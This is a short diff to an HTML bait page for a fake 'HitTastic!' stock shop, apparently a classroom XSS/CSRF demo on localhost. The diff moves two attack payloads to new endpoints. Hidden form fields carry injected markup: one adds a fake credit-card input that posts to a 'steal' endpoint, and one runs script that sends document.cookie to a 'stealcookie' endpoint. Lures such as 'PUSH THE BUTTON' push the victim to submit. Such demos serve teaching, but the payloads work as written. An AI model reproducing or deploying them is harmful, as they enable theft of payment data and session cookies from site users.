@@ -25,12 +25,12 @@ you to buy HitTastic! stock at <em>knock-down prices!!!!!</em> Just
 <strong>PUSH THE BUTTON</strong> below. You know you want to!</p>
 <p>
 <form method="post" action="http://localhost:3000/buy">
-<input type="hidden" name="id" value="1<form action=http://localhost/xss/steal.php>Input credit card:<input name=creditcard /></form>" />
+<input type="hidden" name="id" value="1<form action=http://localhost:3001/steal>Input credit card:<input name=creditcard /></form>" />
 <input type="submit" value="BUY WOOP FOR ONLY 1p !!!!" />
 </form>
 </p>
 <p><form method="post" action="http://localhost:3000/buy">
-<input type="hidden" name="id" value="17<script>window.location='http://localhost/xss/stealcookie.php?cookie=' + document.cookie</script>" />
+<input type="hidden" name="id" value="17<script>window.location='http://localhost:3001/stealcookie?cookie=' + document.cookie</script>" />
 <input type="submit" value="BUY ELVIS FOR ONLY 5p !!!!" />
 </form>
 </p>
